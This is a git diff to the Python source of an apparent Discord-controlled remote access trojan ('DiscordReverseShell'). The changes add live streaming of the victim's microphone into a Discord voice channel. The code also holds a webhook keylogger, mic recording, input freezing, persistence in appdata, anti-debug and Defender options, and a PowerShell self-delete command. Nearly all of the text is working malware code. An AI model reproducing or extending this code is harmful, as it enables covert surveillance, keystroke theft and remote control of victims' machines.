@@ -1,7 +1,7 @@
 import os, discord, subprocess, requests, ctypes, zipfile, threading, keyboard, winreg
 from pynput.mouse import Controller
 from PIL import ImageGrab, Image
-import cv2
+import cv2, pyaudio, datetime
 #from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG
@@ -77,14 +77,28 @@ if MOVE and file_dir[:1].upper() + file_dir[1:] != f"{os.getenv('appdata')}\Micr
 #    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
 #    
 #if ERROR:
-#    error_t = threading.Thread(target=error).start()
+#    error_t = threading.Thread(target=error, daemon=True).start()
 
 
 login = os.getlogin()
 client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
 freezed = False
-#original_dir = os.getcwd()
+#original_dir = os.path.dirname(__file__)
+
+
+#opus_path = os.path.join(os.path.dirname(sys.argv[0]), "libopus-0.x64.dll")
+#discord.opus.load_opus(opus_path)
+
+class PyAudioPCM(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1):
+        self.chunks = chunk
+        self.stream = pyaudio.PyAudio().open(format=pyaudio.paInt16, channels=channels, rate=rate, input=True, input_device_index=input_device, frames_per_buffer=chunk)
+
+    def read(self):
+        return self.stream.read(self.chunks)
+
+
 
 
 def check_token(token):
@@ -224,7 +238,7 @@ async def browsers(channel):
 def freeze():
     global blocking
     blocking = True
-    block = threading.Thread(target=block_input)
+    block = threading.Thread(target=block_input, daemon=True)
     block.start()
             
 def block_input():
@@ -292,7 +306,7 @@ async def on_ready():
 
 
 @client.event
-async def on_message(message):    
+async def on_message(message): 
     if message.author == client.user: #if message.author == client.user or message.channel.name != session_id:
         return
 
@@ -644,9 +658,10 @@ async def on_message(message):
     elif message.content == "keylogger":
         await message.reply("Creating new webhook for keylogger...")
         try:
+            global keylogger
             webhook = await message.channel.create_webhook(name="Keylogger")
             await message.reply(f"Created webhook, using URL: {webhook.url}")
-            keylogger = threading.Thread(target=Keylogger(webhook.url).run)
+            keylogger = threading.Thread(target=Keylogger(webhook.url).run, daemon=True)
             keylogger.start()
             
             #Keylogger(webhook.url).run()
@@ -656,6 +671,10 @@ async def on_message(message):
         
         await message.reply("Keylogger enabled!")
     
+    #elif message.content == "keylogger stop":
+    #    #keylogger.stop()
+    #    keylogger.join()
+
 
 #! FREEZE
     elif message.content.startswith("freeze "):
@@ -803,7 +822,7 @@ async def on_message(message):
         try:
             webhook = await message.channel.create_webhook(name="Mic")
             await message.reply(f"Created webhook, using URL: {webhook.url}")
-            mic_recorder = threading.Thread(target=RecordMic, args=(120, webhook.url))
+            mic_recorder = threading.Thread(target=RecordMic, args=(120, webhook.url), daemon=True)
             mic_recorder.start()
         except:
             await message.reply(f"Failed to create new webhook!")
@@ -814,7 +833,30 @@ async def on_message(message):
 
 #! LIVE MIC
     elif message.content == "join":
-        ...
+        time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        global vc, voice_channel
+        try: 
+            vc.stop()
+            await voice_channel.delete()
+
+            embed = discord.Embed(title="Live mic", description=f"```Stopped live mic:\n{time}```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+            return
+        except: pass
+
+        try:
+            #global vc, voice_channel
+
+            guild = message.guild
+            voice_channel = await guild.create_voice_channel(f"mic-{session_id}")
+            vc = await voice_channel.connect(self_deaf=True)
+            vc.play(PyAudioPCM(channels=1))
+
+            embed = discord.Embed(title="Live mic", description=f"```Started live mic:\n{time}```", color=0xfafafa)
+            embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
+            await message.reply(embed=embed)
+        except: pass
 
 
 #SELF DESTRUCT
@@ -828,7 +870,12 @@ async def on_message(message):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(embed=embed)
 
+            try: 
+                vc.stop()
+                await voice_channel.delete()
+            except: pass
             await client.close()
+
             #cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{dir}' -Recurse -Force"
             cmd = f"powershell Start-Sleep -Seconds 5; Remove-Item -Path '{sys.argv[0]}'"
             subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
@@ -840,10 +887,18 @@ async def on_message(message):
 
 #QUIT
     elif message.content == "!quit":
+        try: 
+            vc.stop()
+            await voice_channel.delete()
+        except: pass
         await client.close()
 
 #EXIT  
     elif message.content == "!exit":
+        try: 
+            vc.stop()
+            await voice_channel.delete()
+        except: pass
         await message.channel.delete()
         await client.close()
        
